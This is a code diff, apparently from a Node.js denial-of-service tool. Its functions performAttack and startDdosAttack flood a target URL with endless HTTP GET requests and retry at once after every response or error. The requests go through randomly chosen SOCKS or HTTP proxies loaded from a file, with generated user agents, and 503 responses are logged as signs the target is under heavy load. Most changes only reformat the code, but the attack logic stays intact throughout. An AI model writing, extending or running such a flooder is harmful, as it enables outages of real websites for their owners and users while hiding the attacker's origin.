@@ -5,7 +5,9 @@ const SocksProxyAgent = require("socks-proxy-agent");
 const HttpsProxyAgent = require("https-proxy-agent");
 const readline = require("readline");
 
-const { generateUserAgent } = require("./useragent.js");
+const {
+    generateUserAgent
+} = require("./useragent.js");
 
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
@@ -70,26 +72,32 @@ const loadProxies = () => {
 
 // ANSI escape codes for colors
 const colors = {
-    red: "\x1b[31m",  // Red
-    green: "\x1b[32m", // Green
-    yellow: "\x1b[33m", // Yellow
-    reset: "\x1b[0m", // Reset
+    red: "\x1b[31m",
+    // Red
+    green: "\x1b[32m",
+    // Green
+    yellow: "\x1b[33m",
+    // Yellow
+    reset: "\x1b[0m",
+    // Reset
 };
 
 const performAttack = (url, agent, headers) => {
     axios
-        .get(url, { httpAgent: agent || null, headers, timeout: 0 })
-        .then(() => setTimeout(() => performAttack(url, agent, headers), 0))
-        .catch((err) => {
-            if (err.response?.status === 503) {
-                console.log(`${colors.red}Target under heavy load (503).${colors.reset}`);
-            } else if (err.response?.status === 502) {
-                console.log(`${colors.red}Error: Bad Gateway (502).${colors.reset}`);
-            } else {
-                console.log(`${colors.red}Request error: ${err.message}${colors.reset}`);
-            }
-            setTimeout(() => performAttack(url, agent, headers), 0);
-        });
+    .get(url, {
+        httpAgent: agent || null, headers, timeout: 0
+    })
+    .then(() => setTimeout(() => performAttack(url, agent, headers), 0))
+    .catch((err) => {
+        if (err.response?.status === 503) {
+            console.log(`${colors.red}Target under heavy load (503).${colors.reset}`);
+        } else if (err.response?.status === 502) {
+            console.log(`${colors.red}Error: Bad Gateway (502).${colors.reset}`);
+        } else {
+            console.log(`${colors.red}Request error: ${err.message}${colors.reset}`);
+        }
+        setTimeout(() => performAttack(url, agent, headers), 0);
+    });
 };
 
 const startDdosAttack = async (targetUrl) => {
@@ -120,14 +128,13 @@ const startDdosAttack = async (targetUrl) => {
 
     // Randomly pick a proxy
     const randomProxy = getRandomElement(proxies);
-    const [host, port] = randomProxy.split(":");
+    const proxyParts = randomProxy.split(":");
 
-    const proxyProtocol = host.startsWith("socks") ? "socks5" : "http";
-    const proxyUrl = `${proxyProtocol}://${host}:${port}`;
+    const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5": "http";
+    const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
 
     const agent = proxyProtocol === "socks5"
-        ? new SocksProxyAgent(proxyUrl)
-        : new HttpsProxyAgent(proxyUrl);
+    ? new SocksProxyAgent(proxyUrl): new HttpsProxyAgent(proxyUrl);
 
     // Perform the attack with the randomly selected proxy
     performAttack(targetUrl, agent, headers);
